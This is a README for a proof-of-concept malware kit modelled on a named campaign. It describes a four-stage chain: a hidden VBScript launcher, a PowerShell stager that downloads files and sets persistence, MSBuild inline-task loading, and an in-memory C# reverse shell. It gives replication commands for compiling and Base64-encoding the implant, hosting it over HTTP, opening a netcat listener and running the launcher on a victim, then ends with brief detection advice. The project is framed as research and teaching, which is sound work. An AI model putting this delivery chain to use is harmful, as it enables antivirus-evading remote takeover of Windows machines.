# ⚡ SHADOW#REACTOR – Advanced Malware Delivery & Reflective Loading PoC

> [!CAUTION] **Ethical Notice:** This project was developed **strictly for educational and cybersecurity research purposes**. Using these techniques without prior authorization on third‑party systems is **illegal**. The author assumes no responsibility for any misuse of this material.

## 📖 Introduction

This repository presents a **Proof of Concept (PoC)** inspired by the **SHADOW#REACTOR (2026)** malware campaign. The project demonstrates how attackers leverage **Living‑off‑the‑Land (LotL)** techniques and **Reflective Loading** to execute malicious code directly in RAM, thereby **bypassing traditional antivirus (AV)** solutions and signature‑based **EDR** detections.

## 🏗️ Project Structure

```
SHADOW-REACTOR-PoC/
├── delivery/
│   ├── launcher.vbs    # Initial vector (hidden VBScript)
│   ├── loader.xml      # MSBuild configuration for CodeTaskFactory injection
│   └── stager.ps1      # Automation for download, validation, and persistence
├── payloads/
│   └── implant.cs      # Reverse Shell in C# (TCP Socket)
└── qpwoe64.txt         # Final Base64 payload (generated after implant compilation)
```

## ⚙️ Technical Workflow

The attack chain is modular, executed in **four stages**, minimizing binary writes to disk:

1. **Initial Vector** → `launcher.vbs` invokes a hidden PowerShell interpreter.
2. **Staging** → `stager.ps1` downloads `loader.xml` and the encrypted payload (`qpwoe64.txt`) into `%TEMP%`.
3. **LotL Execution** → `MSBuild.exe` processes the malicious XML.
4. **Reflective Load** → Inline C# code decodes the Base64 payload and loads the assembly directly into memory, initiating the Reverse Shell.

## 🛠️ Replication Guide (Controlled Lab Environment)

### 1. 🔧 IP Mapping & Configuration

Edit the files with the attacker machine’s IP (Kali Linux):

|File|Line / Section|Expected Value|
|---|---|---|
|launcher.vbs|Line 3 (url)|`http://KALI-IP/stager.ps1`|
|stager.ps1|Line 2 ($server)|`http://KALI-IP`|
|implant.cs|GetConfig function|Kali IP encoded in Base64|

💡 **Tip:** On Kali, generate the IP in Base64:

```bash
echo -n "192.168.x.x" | base64
```

### 2. 🖥️ Payload Preparation (Windows Dev)

```powershell
# 1. Define .NET compiler
$csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"

# 2. Compile implant.cs
& $csc /target:exe /out:"payload.exe" "payloads\implant.cs"

# 3. Convert binary to Base64
$bytes = [IO.File]::ReadAllBytes("payload.exe")
$b64 = [Convert]::ToBase64String($bytes)
[System.IO.File]::WriteAllText("qpwoe64.txt", $b64)
```

### 3. 🌐 Server Setup (Kali Linux)

```bash
# HTTP server
sudo python3 -m http.server 80

# Reverse Shell listener
nc -lnvp 443
```

### 4. 💻 Execution on Victim (Windows 10/11)

Run only `launcher.vbs`. The remaining steps (download, persistence, and in‑memory injection) occur **automatically**.

## 🛡️ Defensive Measures (Blue Team)

- **Process Detection:** Monitor suspicious chains → `wscript.exe → powershell.exe → msbuild.exe`.
- **Binary Restrictions (LotL):** Block `MSBuild.exe` and native compilers via **AppLocker** or **WDAC**.
- **Logging:** Enable **PowerShell Script Block Logging (Event ID 4104)** to capture dynamic script execution.
